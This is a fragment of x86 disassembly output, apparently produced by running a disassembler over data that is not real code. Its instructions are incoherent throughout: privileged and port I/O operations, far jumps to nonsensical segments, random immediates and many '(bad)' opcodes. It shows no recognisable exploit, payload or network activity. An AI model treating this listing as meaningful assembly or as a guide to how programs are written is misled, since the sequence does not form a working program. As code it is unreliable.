  41b33d:	ss imul edi,eax,0xffffffa3
  41b341:	adc    esp,DWORD PTR [eax-0x12]
  41b344:	mov    ebp,0x4f7b43ca
  41b349:	xchg   edx,eax
  41b34a:	shl    DWORD PTR [esi],0x16
  41b34d:	repnz add ch,BYTE PTR [ebp-0x79]
  41b351:	loopne 0x41b36f
  41b353:	cmp    al,0x96
  41b355:	jmp    0xe4d065b8
  41b35a:	ja     0x41b3b3
  41b35c:	cmp    esp,edi
  41b35e:	add    BYTE PTR [eax],dh
  41b360:	popa   
  41b361:	pop    ss
  41b362:	pop    edi
  41b363:	icebp  
  41b364:	cmp    dl,dl
  41b366:	loop   0x41b357
  41b368:	bnd ret 
  41b36a:	and    DWORD PTR [esi],ebx
  41b36c:	push   ebx
  41b36d:	aaa    
  41b36e:	lods   al,BYTE PTR ds:[esi]
  41b36f:	fst    DWORD PTR [eax-0x6a60bb9d]
  41b375:	dec    esp
  41b376:	mov    DWORD PTR [ebp-0x23e6890f],eax
  41b37c:	inc    esp
  41b37d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b37e:	dec    edx
  41b37f:	mov    edx,0x175de298
  41b384:	ret    
  41b385:	hlt    
  41b386:	in     al,dx
  41b387:	int    0xae
  41b389:	shr    ebx,0x1c
  41b38c:	stc    
  41b38d:	out    0xfe,eax
  41b38f:	pop    ecx
  41b390:	in     al,dx
  41b391:	ss in  al,0x78
  41b394:	mov    cl,0x39
  41b396:	(bad)  ds:0xed13eec8
  41b39c:	ja     0x41b3e4
  41b39e:	jne    0x41b392
  41b3a0:	ins    BYTE PTR es:[edi],dx
  41b3a1:	jmp    0x41b333
  41b3a3:	loope  0x41b3b5
  41b3a5:	mov    cl,0xcb
  41b3a7:	or     esi,edx
  41b3a9:	imul   eax,DWORD PTR [ebx],0xffffffc3
  41b3ac:	xchg   ebp,eax
  41b3ad:	or     ebx,DWORD PTR [ebx]
  41b3af:	mov    BYTE PTR [ebp+0x67],bl
  41b3b2:	cmp    BYTE PTR [eax+eiz*1-0xb],cl
  41b3b6:	dec    ebp
  41b3b7:	lock mov eax,0xd9913c9c
  41b3bd:	inc    eax
  41b3be:	nop
  41b3bf:	int3   
  41b3c0:	jmp    0xe189:0xe4d35349
  41b3c7:	mov    eax,0xf5b5ee96
  41b3cc:	push   0x224c0a67
  41b3d1:	repnz fwait
  41b3d3:	aaa    
  41b3d4:	jle    0x41b44a
  41b3d6:	adc    DWORD PTR [edi-0x32e6622e],ebp
  41b3dc:	adc    esp,ecx
  41b3de:	mov    ah,0x43
  41b3e1:	mov    ch,BYTE PTR [esi+ecx*2+0x3a613ffc]
  41b3e8:	xor    BYTE PTR [ecx],ch
  41b3ea:	push   0x6e
  41b3ec:	adc    ch,BYTE PTR [esi+0x4f]
  41b3ef:	std    
  41b3f0:	sub    esi,edx
  41b3f2:	sub    esp,DWORD PTR [edi]
  41b3f4:	jbe    0x41b3b2
  41b3f6:	push   esi
  41b3f7:	inc    esp
  41b3f8:	jns    0x41b3e6
  41b3fa:	ins    BYTE PTR es:[edi],dx
  41b3fb:	and    BYTE PTR [ecx+0x6b],0xfa
  41b3ff:	addr16 mov cl,0xc4
  41b402:	xor    DWORD PTR [edi+0x7d],edx
  41b405:	mov    bl,0x89
  41b407:	aad    0x1b
  41b409:	jnp    0x41b485
  41b40b:	xor    eax,0x508849d4
  41b410:	in     al,0x84
  41b412:	test   al,0x7c
  41b414:	jmp    0xb4d9c1a2
  41b419:	inc    DWORD PTR [ebx+0x7c]
  41b41c:	ins    DWORD PTR es:[edi],dx
  41b41d:	add    al,0xdf
  41b41f:	push   0x98f10763
  41b424:	test   eax,0xf2bd6695
  41b429:	adc    DWORD PTR [edi+esi*2+0x759ee6e8],0xbdea298e
  41b434:	cdq    
  41b435:	xchg   BYTE PTR [edi-0x146245e5],ah
  41b43b:	mov    ch,0x76
  41b43d:	stos   BYTE PTR es:[edi],al
  41b43e:	iretw  
  41b440:	adc    al,0xd7
  41b442:	ret    0x4b8e
  41b445:	js     0x41b4a1
  41b447:	neg    BYTE PTR [ecx]
  41b449:	or     dl,bh
  41b44b:	mov    dl,0x50
  41b44d:	stc    
  41b44e:	xlat   BYTE PTR ds:[ebx]
  41b44f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b450:	ins    BYTE PTR es:[edi],dx
  41b451:	jmp    0x265d:0x4ab7a897
  41b458:	fistp  WORD PTR [esi+edx*2+0x43]
  41b45c:	imul   edi,DWORD PTR [edi+ebx*8-0x69],0xd9da64ac
  41b464:	inc    esp
  41b465:	lock hlt 
  41b467:	(bad)  
  41b468:	leave  
  41b469:	xchg   esi,eax
  41b46a:	ja     0x41b406
  41b46c:	adc    eax,0xf4fbf2d1
  41b471:	scas   eax,DWORD PTR es:[edi]
  41b472:	jmp    0x8d2b:0xb58db5d7
  41b479:	xchg   ebx,eax
  41b47a:	scas   eax,DWORD PTR es:[edi]
  41b47b:	addr16 (bad) 
  41b47e:	arpl   bx,dx
  41b480:	pop    ss
  41b481:	add    BYTE PTR [ecx+0x4bbd94c4],dh
  41b487:	sub    ecx,ebp
  41b489:	pusha  
  41b48a:	cli    
  41b48b:	sar    BYTE PTR [edi],1
  41b48d:	popa   
  41b48e:	adc    eax,0xd1f79b3b
  41b493:	imul   eax,esi,0xda33ada8
  41b499:	fistp  WORD PTR [eax+0x12]
  41b49c:	xor    al,0x18
  41b49e:	outs   dx,BYTE PTR ds:[esi]
  41b49f:	mov    ebp,0x754215f1
  41b4a4:	test   BYTE PTR [eax-0x3],cl
  41b4a7:	popf   
  41b4a8:	es dec edx
  41b4aa:	mov    dh,0x9
  41b4ac:	ja     0x41b4a4
  41b4ae:	lds    edi,FWORD PTR [edi]
  41b4b0:	cmp    edi,DWORD PTR [ecx+ebp*8]
  41b4b3:	neg    BYTE PTR [esi-0x1f]
  41b4b6:	out    dx,al
  41b4b7:	repnz mov dh,BYTE PTR [edi]
  41b4ba:	xchg   edx,eax
  41b4bb:	aas    
  41b4bc:	fmul   st,st(5)
  41b4be:	push   ss
  41b4bf:	ret    0xecee
  41b4c2:	pop    es
  41b4c3:	cmp    BYTE PTR [esi+0x47914515],0xe7
  41b4ca:	jae    0x41b4c7
  41b4cc:	inc    eax
  41b4cd:	adc    DWORD PTR [edi],esi
  41b4cf:	dec    ebp
  41b4d0:	cmp    eax,0xcf443d5c
  41b4d5:	loopne 0x41b478
  41b4d7:	fiadd  DWORD PTR [edx+0x2e130da6]
  41b4dd:	lea    ecx,[ecx-0x66]
  41b4e0:	not    DWORD PTR [bx+di+0x195f]
  41b4e5:	pop    ecx
  41b4e6:	call   0x8a05:0xc0ffad3c
  41b4ed:	repz or bh,ch
  41b4f0:	scas   al,BYTE PTR es:[edi]
  41b4f1:	imul   BYTE PTR [eax-0x3691b732]
  41b4f7:	and    al,0xe1
  41b4f9:	jmp    0x41b548
  41b4fb:	sbb    al,0x3c
  41b4fd:	sub    BYTE PTR [ebp+0x54],dl
  41b500:	inc    edx
  41b501:	sub    BYTE PTR [eax+0x27],ch
  41b504:	jp     0x41b4b6
  41b506:	daa    
  41b507:	stos   BYTE PTR es:[edi],al
  41b508:	shr    DWORD PTR [ebp-0x2],0x3a
  41b50c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b50d:	into   
  41b50e:	out    dx,al
  41b50f:	add    eax,0x6ff2d89c
  41b514:	stos   DWORD PTR es:[edi],eax
  41b515:	xchg   esi,eax
  41b516:	xchg   esi,eax
  41b517:	xor    BYTE PTR [eax-0x45],0x80
  41b51b:	fucomp st(2)
  41b51d:	inc    ecx
  41b51e:	pushf  
  41b51f:	loop   0x41b528
  41b521:	inc    ebx
  41b522:	sar    BYTE PTR [ebx+0x49],0x16
  41b526:	call   0x4fb:0xa860f663
  41b52d:	sti    
  41b52e:	mul    cl
  41b530:	bound  ebp,QWORD PTR [edi+esi*2-0x1d]
  41b534:	pop    es
  41b535:	les    eax,FWORD PTR [edi+0x6c291c22]
  41b53b:	adc    esp,DWORD PTR ds:0x2fffd309
  41b541:	mov    WORD PTR [ecx-0x5d],?
  41b544:	loop   0x41b4e0
  41b546:	icebp  
  41b547:	pop    ds
  41b548:	xor    ebp,esp
  41b54a:	and    al,0x34
  41b54c:	mov    eax,0x10f8c2c
  41b551:	mov    ecx,0x5a5a9ace
  41b556:	fisub  DWORD PTR [edi-0x2d5ee167]
  41b55c:	and    al,0x9a
  41b55e:	ds fs scas eax,DWORD PTR es:[edi]
  41b561:	cmp    BYTE PTR [eax+0x4a],al
  41b564:	imul   BYTE PTR [ebx+0x3f]
  41b567:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b568:	jne    0x41b553
  41b56a:	pop    ecx
  41b56b:	test   DWORD PTR [ebx-0x29],esp
  41b56e:	fsubr  DWORD PTR [ebx]
  41b570:	adc    ecx,DWORD PTR [edi-0x3190f68c]
  41b576:	xor    cl,BYTE PTR [ecx+eax*4]
  41b579:	js     0x41b573
  41b57b:	mov    al,ds:0xd0b23050
  41b580:	sti    
  41b581:	mov    ah,0x30
  41b583:	hlt    
  41b584:	popf   
  41b585:	mov    edx,ss
  41b587:	je     0x41b585
  41b589:	mov    ch,0x37
  41b58b:	cmp    al,0xae
  41b58d:	push   ss
  41b58e:	nop
  41b58f:	pop    es
  41b590:	sti    
  41b591:	in     eax,dx
  41b592:	sti    
  41b593:	push   ds
  41b594:	cmp    edx,ecx
  41b596:	out    dx,eax
  41b597:	inc    edx
  41b598:	push   cs
  41b599:	cmc    
  41b59a:	pop    eax
  41b59b:	repz retf 
  41b59d:	dec    ebx
  41b59e:	aas    
  41b59f:	mov    DWORD PTR [edi+0x2906a469],edi
  41b5a5:	call   0xd4a5:0x441e5920
  41b5ac:	pop    es
  41b5ad:	idiv   ebx
  41b5af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5b0:	clc    
  41b5b1:	adc    ebp,ebp
  41b5b3:	popf   
  41b5b4:	rol    BYTE PTR [ebp-0x51],0x2
  41b5b8:	inc    edx
  41b5b9:	mov    ebx,DWORD PTR [edi-0x732b07d6]
  41b5bf:	outs   dx,DWORD PTR ds:[esi]
  41b5c0:	fadd   st(5),st
  41b5c2:	xchg   ebx,eax
  41b5c3:	outs   dx,BYTE PTR ds:[esi]
  41b5c4:	in     al,dx
  41b5c5:	std    
  41b5c6:	test   al,0xf8
  41b5c8:	sar    DWORD PTR [eax-0x5286d7ec],1
  41b5ce:	es repz scas eax,DWORD PTR es:[edi]
  41b5d1:	mov    ?,WORD PTR [ebx]
  41b5d3:	adc    ch,BYTE PTR [edx]
  41b5d5:	mov    al,0xf5
  41b5d7:	or     eax,DWORD PTR [eax]
  41b5d9:	inc    eax
  41b5da:	or     ecx,DWORD PTR [ebp-0x2b447cdb]
  41b5e0:	sub    eax,eax
  41b5e2:	xchg   ecx,eax
  41b5e3:	fnstcw WORD PTR [esi-0x4d]
  41b5e6:	loopne 0x41b5fe
  41b5e8:	inc    eax
  41b5e9:	daa    
  41b5ea:	(bad)  
  41b5eb:	pop    esp
  41b5ec:	cs and eax,0x4ee1f16d
  41b5f2:	ror    BYTE PTR [esi],0x2e
  41b5f5:	retf   
  41b5f6:	(bad)
  41b5f9:	leave  
  41b5fa:	call   0x47aa:0x6fc8695d
  41b601:	imul   esi,DWORD PTR [eax+0x11ad2e45],0xc
  41b608:	adc    BYTE PTR [ebp-0x2b],dh
  41b60b:	pop    edi
  41b60c:	scas   eax,DWORD PTR es:[edi]
  41b60d:	mov    edx,0xa365ace4
  41b612:	jmp    0xde89:0x895dc301
  41b619:	adc    ebx,ebp
  41b61b:	ins    BYTE PTR es:[edi],dx
  41b61c:	lds    ecx,FWORD PTR [edx+0x1]
  41b61f:	mov    bl,0xe6
  41b621:	jnp    0x41b5af
  41b623:	pop    eax
  41b624:	jbe    0x41b64c
  41b626:	stc    
  41b627:	or     ah,BYTE PTR [edx+0x1e]
  41b62a:	mov    dl,0x6c
  41b62c:	mov    ah,0xe0
  41b62e:	repnz and DWORD PTR [esi],ebx
  41b631:	mov    DWORD PTR [ebx+0x31],edi
  41b634:	in     eax,0xaa
  41b636:	jo     0x41b64d
  41b638:	xor    eax,0x3026d141
  41b63d:	dec    edx
  41b63e:	test   DWORD PTR [edi+0x49dfa1cb],ebp
  41b644:	cmp    DWORD PTR [edi-0xf],ebp
  41b647:	add    dh,al
  41b649:	adc    eax,0xa1ccee10
  41b64e:	or     ah,bl
  41b650:	mov    ecx,DWORD PTR [esi]
  41b652:	ret    0x9fb7
  41b655:	inc    ebx
  41b656:	dec    esi
  41b657:	ja     0x41b5de
  41b659:	dec    ebx
  41b65a:	imul   esi,DWORD PTR [eax+0x6b],0x77e89e1a
  41b661:	mov    esp,0xbf07b634
  41b666:	add    bl,ch
  41b668:	push   eax
  41b669:	ins    BYTE PTR es:[edi],dx
  41b66a:	sbb    bh,cl
  41b66c:	inc    esp
  41b66d:	out    0xc8,al
  41b66f:	dec    edx
  41b670:	push   cs
  41b671:	retf   
  41b672:	pop    ss
  41b673:	fnsave [edi]
  41b675:	imul   edx,DWORD PTR [ebx-0x3f6853c3],0xe8aaec0
  41b67f:	xlat   BYTE PTR cs:[ebx]
  41b681:	pop    edi
  41b682:	sub    DWORD PTR [esi+eiz*1],esi
  41b685:	inc    eax
  41b686:	imul   esi,DWORD PTR ds:0x511e86aa,0x6ca0b74c
  41b690:	sbb    BYTE PTR [edx+edx*2-0xfd13812],dh
  41b697:	pop    ebx
  41b698:	jns    0x41b69b
  41b69a:	xor    eax,0x6370cd91
  41b69f:	sbb    BYTE PTR [ecx-0x4fee084c],ah
  41b6a5:	stc    
  41b6a6:	loope  0x41b64e
  41b6a8:	pusha  
  41b6a9:	mov    eax,ds:0xb5a0d36b
  41b6ae:	adc    ebp,DWORD PTR [ebp+0x92f3751]
  41b6b4:	into   
  41b6b5:	outs   dx,DWORD PTR ds:[esi]
  41b6b6:	bound  edx,QWORD PTR [ecx-0x32]
  41b6b9:	cmp    BYTE PTR [edi],0x28
  41b6bc:	or     BYTE PTR [ebp+ecx*1-0x2a0b7ad7],ah
  41b6c3:	lock jge 0x41b65d
  41b6c6:	cmp    DWORD PTR [ebx+0x56],0x61
  41b6ca:	scas   al,BYTE PTR es:[edi]
  41b6cb:	mov    ch,0xf2
  41b6cd:	call   esp
  41b6cf:	pop    edi
  41b6d0:	cs inc ebx
  41b6d2:	stos   BYTE PTR es:[edi],al
  41b6d3:	repnz ror BYTE PTR [ecx],cl
  41b6d6:	js     0x41b661
  41b6d8:	cmp    DWORD PTR ds:0x6ea10987,ecx
  41b6de:	in     al,0xc2
  41b6e0:	pop    esp
  41b6e1:	and    eax,ebp
  41b6e3:	xor    DWORD PTR [ecx+edx*1-0x2b],edx
  41b6e7:	jge    0x41b750
  41b6e9:	in     al,dx
  41b6ea:	ret    
  41b6eb:	xor    al,0x61
  41b6ed:	cmc    
  41b6ee:	cmp    ebx,DWORD PTR [esp+ebp*8-0x4d]
  41b6f2:	div    BYTE PTR [ebx+eiz*8-0x4f659ca2]
  41b6f9:	sub    DWORD PTR [esi+0x5580839e],ecx
  41b6ff:	cmp    al,0x10
  41b701:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b702:	mov    edi,0xbebf1c79
  41b707:	add    al,0xd7
  41b709:	jnp    0x41b6b5
  41b70b:	or     eax,0x51e15451
  41b710:	mov    dh,0x24
  41b712:	inc    eax
  41b713:	pushf  
  41b714:	fstp   QWORD PTR [ebx+ecx*4+0x7b403897]
  41b71b:	lods   eax,DWORD PTR ds:[esi]
  41b71c:	stos   DWORD PTR es:[edi],eax
  41b71d:	pushf  
  41b71e:	push   ebp
  41b71f:	out    dx,al
  41b720:	aas    
  41b721:	test   al,0xb
  41b723:	(bad)  
  41b724:	mov    ch,0x9d
  41b726:	loope  0x41b760
  41b728:	push   0x61
  41b72a:	adc    eax,0xb4308b81
  41b72f:	xor    BYTE PTR [edx+eiz*2-0x29],bh
  41b733:	aam    0x32
  41b735:	pushf  
  41b736:	rcr    DWORD PTR [edi+0x317beab2],0x51
  41b73d:	rcr    DWORD PTR [ecx-0x1f816112],1
  41b743:	push   0xea3ab54b
  41b748:	mov    al,0x18
  41b74a:	scas   eax,DWORD PTR es:[edi]
  41b74b:	sub    al,dh
  41b74d:	loop   0x41b735
  41b74f:	addr16 lahf 
  41b751:	pop    ds
  41b752:	dec    ebp
  41b753:	ss inc esp
  41b755:	mov    dh,0xb4
  41b757:	sbb    dl,BYTE PTR [esi+0x5a]
  41b75a:	test   BYTE PTR [ebx+eax*8+0x1f06a253],dl
  41b761:	aaa    
  41b762:	int    0x79
  41b764:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b765:	outs   dx,BYTE PTR ds:[esi]
  41b766:	fist   DWORD PTR ds:0x8aec1e85
  41b76c:	std    
  41b76d:	jo     0x41b779
  41b76f:	data16 mov cs,WORD PTR [edx-0x54]
  41b773:	push   es
  41b774:	retf   
  41b775:	xor    al,0x9
  41b777:	sahf   
  41b778:	fyl2xp1 
  41b77a:	mov    ecx,0x8a2258b8
  41b77f:	xlat   BYTE PTR ds:[ebx]
  41b780:	retf   
  41b781:	int3   
  41b782:	shl    DWORD PTR [esi],cl
  41b784:	sbb    al,0x94
  41b786:	pusha  
  41b787:	pop    ss
  41b788:	jmp    0x41b7de
  41b78a:	ret    0x3514
  41b78d:	push   esi
  41b78e:	adc    edi,DWORD PTR [esi+0x1f]
  41b791:	xor    al,BYTE PTR [edi]
  41b793:	inc    ebx
  41b794:	in     eax,dx
  41b795:	lods   eax,DWORD PTR ds:[esi]
  41b796:	jp     0x41b782
  41b798:	cli    
  41b799:	adc    BYTE PTR [edi+0x1d7cdf3f],0x97
  41b7a0:	adc    ch,BYTE PTR [ecx]
  41b7a2:	pop    DWORD PTR [ecx+edi*1]
  41b7a5:	test   DWORD PTR [ebx+ebx*8-0x825e354],0xc9221ed9
  41b7b0:	inc    ecx
  41b7b1:	out    0xf8,al
  41b7b3:	imul   ebx,DWORD PTR [esi-0xc],0x9faca4ff
  41b7ba:	and    bl,BYTE PTR [ecx+ebx*1+0x374dbf25]
  41b7c1:	xor    ah,BYTE PTR [ebp-0x2dc019f9]
  41b7c7:	js     0x41b74e
  41b7c9:	and    ah,bl
  41b7cb:	jb     0x41b7de
  41b7cd:	push   ebp
  41b7ce:	iret   
  41b7cf:	jns    0x41b816
  41b7d1:	xchg   ebx,eax
  41b7d2:	push   eax
  41b7d3:	or     eax,0x15782f62
  41b7d8:	sub    BYTE PTR [eax+0x58],cl
  41b7db:	mov    ah,0x2b
  41b7dd:	dec    eax
  41b7de:	(bad)  
  41b7df:	and    eax,0x4065a62a
  41b7e4:	cli    
  41b7e5:	in     al,dx
  41b7e6:	ret    0x6d35
  41b7e9:	sbb    ch,al
  41b7eb:	push   ds
  41b7ec:	xor    DWORD PTR [ebx+edx*1],eax
  41b7ef:	xor    BYTE PTR [eax+ebp*8],dh
  41b7f2:	xor    esp,DWORD PTR [ebp+0x15]
  41b7f5:	(bad)  
  41b7f6:	push   edx
  41b7f7:	rcl    DWORD PTR [eax+eiz*2],cl
  41b7fa:	pop    edx
  41b7fb:	and    eax,0x89490117
  41b800:	out    0x4d,al
  41b802:	xor    bl,ch
  41b804:	pusha  
  41b805:	and    edx,ebx
  41b807:	mov    al,0x8e
  41b809:	aad    0xf5
  41b80b:	and    eax,0xb93921ce
  41b810:	gs addr16 xchg edx,eax
  41b813:	popf   
  41b814:	retf   0x9aa9
  41b817:	push   esp
  41b818:	sti    
  41b819:	sahf   
  41b81a:	(bad)  [eax-0x34ea762]
  41b820:	test   eax,0x14c3b839
  41b825:	test   eax,eax
  41b827:	test   al,0xa8
  41b829:	xchg   esp,eax
  41b82a:	jmp    0x41b89a
  41b82c:	test   al,0xa7
  41b82e:	push   cs
  41b82f:	in     al,0xe3
  41b831:	mov    esi,DWORD PTR [edx]
  41b833:	adc    al,0x1a
  41b835:	sub    BYTE PTR [esi+0x52],cl
  41b838:	iret   
  41b839:	cli    
  41b83a:	nop
  41b83b:	fdivr  st(5),st
  41b83d:	shl    dh,0x59
  41b840:	sbb    al,BYTE PTR ds:0xe78525fb
  41b846:	jb     0x41b7df
  41b848:	fs leave 
  41b84a:	dec    eax
  41b84b:	rcr    DWORD PTR [esi+eax*4],0x24
  41b84f:	imul   esp,DWORD PTR [edi+0x58],0x160558b6
  41b856:	mov    bh,0xdd
  41b858:	loop   0x41b844
  41b85a:	(bad)  
  41b85e:	adc    al,0xc1
  41b860:	lgdtd  [eax]
  41b863:	in     eax,0x5
  41b865:	cmp    BYTE PTR [edx+ebp*8],0x5d
  41b869:	cmp    DWORD PTR [edi+ecx*4-0x70e6a127],0xffffffb9
  41b871:	stc    
  41b872:	aad    0x23
  41b874:	inc    ebp
  41b875:	out    0x2e,eax
  41b877:	sub    eax,0x642dedaa
  41b87c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b87d:	adc    DWORD PTR [esi-0x5d1276a2],edi
  41b883:	mov    BYTE PTR [edx],al
  41b885:	mov    al,0xca
  41b887:	xlat   BYTE PTR ds:[ebx]
  41b888:	xchg   ecx,eax
  41b889:	mov    fs,ebp
  41b88b:	xchg   DWORD PTR [eax-0x54],esi
  41b88e:	je     0x41b887
  41b890:	adc    al,BYTE PTR [ecx+eax*4+0xfee8727]
  41b897:	stos   DWORD PTR es:[edi],eax
  41b898:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41b89a:	and    eax,DWORD PTR [ebx-0x372ea951]
  41b8a0:	das    
  41b8a1:	and    al,BYTE PTR [esp+edi*8]
  41b8a4:	push   edi
  41b8a5:	mov    WORD PTR [ebx],ss
  41b8a7:	cs pop ds
  41b8a9:	out    0xb2,al
  41b8ab:	jecxz  0x41b8e1
  41b8ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8ae:	repnz addr16 mov ecx,0xe0f77109
  41b8b5:	mov    ch,0x8a
  41b8b7:	sub    DWORD PTR [ecx],ecx
  41b8b9:	or     DWORD PTR [eax+ebx*1-0x1b4c1c65],edi
  41b8c0:	push   ds
  41b8c1:	xor    al,0xce
  41b8c3:	dec    edx
  41b8c4:	lock pop es
  41b8c6:	imul   edx,DWORD PTR [ebx+0x19a847d4],0x2e05e0d
  41b8d0:	mov    ecx,0xc31abe3a
  41b8d5:	mov    DWORD PTR [ebx-0xa],ecx
  41b8d8:	push   ds
  41b8d9:	mov    ecx,0x7d25b010
  41b8de:	mov    ds,edx
  41b8e0:	mov    dh,0x2c
  41b8e2:	push   ss
  41b8e3:	push   0x18
  41b8e5:	sub    eax,0xac764aac
  41b8ea:	dec    ebx
  41b8eb:	xchg   esi,eax
  41b8ec:	mov    BYTE PTR [edx-0x73],dh
  41b8ef:	dec    esi
  41b8f0:	push   es
  41b8f1:	leave  
  41b8f2:	inc    edi
  41b8f3:	lods   eax,DWORD PTR ds:[esi]
  41b8f4:	daa    
  41b8f5:	pusha  
  41b8f6:	inc    edx
  41b8f7:	enter  0x67cd,0x18
  41b8fb:	push   ebp
  41b8fc:	lahf   
  41b8fd:	test   eax,0x667489db
  41b902:	fsubr  st(0),st
  41b904:	push   ss
  41b905:	out    0x60,al
  41b907:	retf   
  41b908:	js     0x41b8ce
  41b90a:	add    al,BYTE PTR [ecx+0x75]
  41b90d:	sub    dh,BYTE PTR [ebp+0x26a800a]
  41b913:	and    eax,0x8a2dcbe3
  41b918:	(bad)  
  41b919:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b91a:	dec    edx
  41b91b:	push   eax
  41b91c:	stos   DWORD PTR es:[edi],eax
  41b91d:	or     dl,BYTE PTR [eax]
  41b91f:	pop    ss
  41b920:	or     BYTE PTR [esi+edi*4],0xaa
  41b924:	cmc    
  41b925:	cmp    eax,0xe29f3601
  41b92a:	rcl    DWORD PTR [edx+0x6a6703a5],1
  41b930:	pusha  
  41b931:	outs   dx,BYTE PTR ss:[esi]
  41b933:	(bad)  
  41b934:	sub    BYTE PTR [eax+0x8830fe9],bl
  41b93a:	or     edi,DWORD PTR [ebx+eax*8-0x6a56a20e]
  41b941:	mov    edx,0xfccf1cf
  41b946:	mov    edi,0x4d91f953
  41b94b:	sbb    ebp,DWORD PTR [eax]
  41b94d:	fwait
  41b94e:	ja     0x41b92e
  41b950:	sub    ebx,DWORD PTR [esi-0x3c2e87fc]
  41b956:	(bad)  
  41b958:	jp     0x41b9b1
  41b95a:	push   eax
  41b95b:	push   edi
  41b95c:	or     BYTE PTR [edi+0xd],0x11
  41b960:	loope  0x41b921
  41b962:	cmp    eax,0x8982ec9
  41b967:	daa    
  41b968:	inc    edx
  41b969:	imul   edi,ebx,0xfffffff8
  41b96c:	shl    DWORD PTR [esi],cl
  41b96e:	jo     0x41b94c
  41b970:	dec    esi
  41b971:	repz push esi
  41b973:	inc    ebp
  41b974:	sahf   
  41b975:	leave  
  41b976:	test   eax,0x2413286f
  41b97b:	imul   ebx,DWORD PTR [ebx+0x4501203b],0xffffffb2
  41b982:	test   eax,0x657db4d6
  41b987:	adc    al,0x1f
  41b989:	pop    ds
  41b98a:	dec    edi
  41b98b:	adc    al,0x45
  41b98d:	imul   ch
  41b98f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b990:	xchg   esi,eax
  41b991:	js     0x9c729d1c
  41b997:	mov    edx,0xdc2edff4
  41b99c:	dec    edi
  41b99d:	add    dl,dh
  41b99f:	pop    eax
  41b9a0:	sahf   
  41b9a1:	retf   0x62d9
  41b9a4:	adc    DWORD PTR ds:0x4ff01922,ebp
  41b9aa:	lahf   
  41b9ab:	lds    edi,FWORD PTR [esi]
  41b9ad:	sub    eax,0x5686f227
  41b9b2:	int    0xd8
  41b9b4:	ret    
  41b9b5:	js     0x41ba05
  41b9b7:	mov    ebx,0x6dd365a4
  41b9bc:	mov    ebp,0xf4d8ae43
  41b9c1:	repnz iret 
  41b9c3:	int    0x16
  41b9c5:	movzx  edi,BYTE PTR [ebx-0x4ad62d19]
  41b9cc:	fsubr  QWORD PTR ss:[edx-0x77706528]
  41b9d3:	dec    ebp
  41b9d4:	je     0x41b9d5
  41b9d6:	inc    ebx
  41b9d7:	jmp    FWORD PTR [ecx]
  41b9d9:	mov    edi,ds
  41b9db:	xchg   BYTE PTR [ebp+eiz*8+0x6b],al
  41b9df:	rcl    DWORD PTR [esi],0x16
  41b9e2:	(bad)  
  41b9e3:	pop    ebp
  41b9e4:	loopne 0x41b99c
  41b9e6:	add    DWORD PTR [esi+0x29b18416],esi
  41b9ec:	ins    DWORD PTR es:[edi],dx
  41b9ed:	pusha  
  41b9ee:	jb     0x41b993
  41b9f0:	scas   eax,DWORD PTR es:[edi]
  41b9f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9f2:	or     BYTE PTR [edi],ch
  41b9f4:	repz cmp eax,ebx
  41b9f7:	jl     0x41b98b
  41b9f9:	fld    QWORD PTR [ebx-0x2c]
  41b9fc:	sbb    al,0xa8
  41b9fe:	mov    edx,0xf67499cc
  41ba03:	(bad)  
  41ba04:	push   0xffffffd9
  41ba06:	test   BYTE PTR [esp+ebp*8+0x6d8120ad],dl
  41ba0d:	shr    DWORD PTR es:[ebp-0x44ca2e67],1
  41ba14:	sub    ecx,DWORD PTR [ecx]
  41ba16:	aam    0x77
  41ba18:	pop    ebp
  41ba19:	push   esp
  41ba1a:	ficomp WORD PTR [edx-0x11]
  41ba1d:	out    0x84,eax
  41ba1f:	test   eax,0xd95fcebd
  41ba24:	mov    esi,0x447cf373
  41ba29:	dec    ecx
  41ba2a:	and    ebx,DWORD PTR ds:0x93961913
  41ba30:	aaa    
  41ba31:	in     eax,0x16
  41ba33:	mov    ebx,0xae7c934d
  41ba38:	gs xchg ebp,eax
  41ba3a:	inc    esi
  41ba3b:	mov    al,0xde
  41ba3d:	in     eax,dx
  41ba3e:	add    eax,0x5337b7af
  41ba43:	jecxz  0x41baa6
  41ba45:	xor    eax,0x74d570b0
  41ba4a:	cmc    
  41ba4b:	scas   eax,DWORD PTR es:[edi]
  41ba4c:	or     BYTE PTR [ebp-0x1d],bh
  41ba4f:	pushf  
  41ba50:	xchg   edi,eax
  41ba51:	ss push eax
  41ba53:	dec    edx
  41ba54:	mov    es,esp
  41ba56:	into   
  41ba57:	or     eax,0xcb30ca89
  41ba5c:	pusha  
  41ba5d:	ds daa 
  41ba5f:	push   esi
  41ba60:	xchg   DWORD PTR [edx],ebp
  41ba62:	cmp    cl,ch
  41ba64:	jnp    0x41ba4c
  41ba66:	sbb    eax,0xe0e8b104
  41ba6b:	and    BYTE PTR [eax],0xd1
  41ba6e:	sbb    dh,BYTE PTR [ebp+0x1dbf31a7]
  41ba74:	sbb    ebx,DWORD PTR [esi]
  41ba76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba77:	cld    
  41ba78:	or     BYTE PTR [ebx+0x24],bl
  41ba7b:	ins    BYTE PTR es:[edi],dx
  41ba7c:	cs out dx,al
  41ba7e:	test   eax,0xfabc1b35
  41ba83:	bound  ebx,QWORD PTR [esi]
  41ba85:	out    0x98,eax
  41ba87:	xchg   ebp,eax
  41ba88:	addr16 hlt 
  41ba8a:	pop    ecx
  41ba8b:	push   0x54cc251e
  41ba90:	daa    
  41ba91:	fsubr  QWORD PTR [ebx]
  41ba93:	lods   al,BYTE PTR ds:[esi]
  41ba94:	sbb    al,0xd0
  41ba96:	push   cs
  41ba97:	push   ebp
  41ba98:	pop    ss
  41ba99:	pusha  
  41ba9a:	inc    esi
  41ba9b:	xor    eax,DWORD PTR [edi]
  41ba9d:	push   ebx
